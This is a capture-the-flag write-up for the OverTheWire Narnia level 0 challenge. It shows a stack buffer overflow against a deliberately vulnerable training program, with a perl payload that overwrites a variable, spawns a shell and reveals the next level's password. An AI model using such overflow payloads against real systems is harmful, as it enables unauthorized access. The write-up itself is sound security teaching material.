# Over the Wire - Narnia

## level 0 -> 1
This game starts off giving you the username and password for level 0. In the /narnia/ directory, there is an executable and c source file for each level.

Running narnia0, the following is output on the terminal:
```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 
```
I have no idea what I'm supposed to do here, so I'm just going to guess I'll find a value to xor 0x41414141 to get 0xdeadbeef. So I enter:
```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 0x9fecffae
buf: 0x9fecffae
val: 0x41414141
WAY OFF!!!!
```

Alrighty then. Guess I'll look at the code:

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
Ok, so is it really reading 24 characters into a buffer of size 20? In that case, I guess I'm supposed to exploit that to mess with the value of val to make it equal to 0xdeadbeef. Then I get shell.

Entering 24 0s:
```
Here is your chance: 000000000000000000000000
buf: 000000000000000000000000
val: 0x30303030
WAY OFF!!!!
```

This confirms that val can be overwritten by entering more than 20 character. Four 0 characters (ASCII code 30) have now been written to val.

Using `objdump --source narnia0`, let's look at some of the assembly. Here are the first few instructions in main, where we can see var being set.
```
0804855b <main>:
 804855b:	55                   	push   %ebp
 804855c:	89 e5                	mov    %esp,%ebp
 804855e:	53                   	push   %ebx
 804855f:	83 ec 18             	sub    $0x18,%esp
 8048562:	c7 45 f8 41 41 41 41 	movl   $0x41414141,-0x8(%ebp) <--- 0x41414141 is moved into var on the stack, 8 bytes from the base pointer
```
Further down a bit, here is where our input is read into memory using scanf:
```
8048583:	8d 45 e4             	lea    -0x1c(%ebp),%eax <--- Our input will be read into the address 28 bytes from the base pointer
 8048586:	50                   	push   %eax
 8048587:	68 d9 86 04 08       	push   $0x80486d9
 804858c:	e8 af fe ff ff       	call   8048440 <__isoc99_scanf@plt>
 8048591:	83 c4 08             	add    $0x8,%esp

```

Because the scanf call will read in up to 24 bytes, it can occupy bytes 28 through 4 from ebp. But this overlaps with var, which occupies bytes 8 through 0 from ebp. The last 4 bytes of our input will clobber the first 4 bytes of var.

Now the trouble is that we're entering in acii data to scanf, and xAD (one of our bytes of deadbeef) does not have a printable ascii representation.

Maybe I can use perl to generate a hex string and pipe the output to the program:
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xde\xad\xbe\xef"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaޭ??
val: 0xefbeadde
WAY OFF!!!!
```
Almost! Forgot to account for byte order, which is little endian. I'll need to input the last bytes in reverse order:
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
```
Ok, the program looks like it ended though. Did I get the shell?
```
narnia0@narnia:/narnia$ whoami
narnia0
```
Apparently not. Maybe I can copy paste the output.
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xef\xbe\xad\xde"'
aaaaaaaaaaaaaaaaaaaaﾭ?narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭ?
buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0x3fadbeef
WAY OFF!!!!
```
Nope. Something is lost in translation. So I somehow need to find a way to get the hex input into the program but also keep it from exiting.

After some searching, I found a useful trick. You can pipe multiple commands into a program by enclosing them in parenthesis. Each command is a separate input to the program. So I could provide two commands, and the first would be used as input for the 'Here is your chance' prompt, and the second would be used as input into the shell that's launched. Let's try it:

```
narnia0@narnia:/narnia$ ( perl -e 'print "a"x20 . "\xef\xbe\xad\xde"'; cat; ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
whoami
narnia1
```

Sweet, it worked. Now I can just `cat /etc/narnia_pass/narnia1`.

<details><summary>Password</summary>
	<p>	
efeidiedae
</p>
</details>
